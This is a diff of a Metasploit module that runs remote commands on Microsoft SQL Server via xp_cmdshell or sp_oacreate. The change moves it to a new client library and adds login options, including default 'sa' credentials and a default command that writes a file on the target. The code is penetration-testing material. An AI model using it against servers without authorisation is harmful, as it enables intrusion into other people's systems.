@@ -3,8 +3,10 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'metasploit/framework/mssql/client'
+
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::Remote::MSSQL
+  include Metasploit::Framework::MSSQL::Client
 
   def initialize(info = {})
     super(
@@ -32,12 +34,20 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       OptString.new('CMD', [ false, 'Command to execute', 'cmd.exe /c echo OWNED > C:\\owned.exe']),
-      OptEnum.new('TECHNIQUE', [true, 'Technique to use for command execution', 'xp_cmdshell', ['xp_cmdshell', 'sp_oacreate']])
+      OptEnum.new('TECHNIQUE', [true, 'Technique to use for command execution', 'xp_cmdshell', ['xp_cmdshell', 'sp_oacreate']]),
+      Opt::RHOST,
+      Opt::RPORT(1433),
+      OptString.new('USERNAME', [ false, 'The username to authenticate as', 'sa']),
+      OptString.new('PASSWORD', [ false, 'The password for the specified username', '']),
+      OptBool.new('TDSENCRYPTION', [ true, 'Use TLS/SSL for TDS data "Force Encryption"', false]),
+      OptBool.new('USE_WINDOWS_AUTHENT', [ true, 'Use windows authentication (requires DOMAIN option set)', false]),
     ])
   end
 
   def run
-    return unless mssql_login_datastore
+    return unless mssql_login(datastore['USERNAME'], datastore['PASSWORD'])
+
+    set_sane_defaults
 
     technique = datastore['TECHNIQUE']
     case technique
